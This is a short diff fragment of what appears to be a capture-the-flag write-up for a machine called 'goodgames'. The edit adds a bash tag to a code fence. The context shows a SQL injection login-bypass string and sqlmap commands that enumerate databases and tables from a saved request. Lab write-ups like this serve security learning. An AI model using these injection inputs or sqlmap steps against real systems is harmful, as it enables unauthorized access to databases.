@@ -10,7 +10,7 @@ admin' or 1=1 -- -
 
 Sqlmap saved request
 
-```
+```bash
 sqlmap -r goodgames.req
 sqlmap -r goodgames.req --dbs
 sqlmap -r goodgames.req -D main --tables
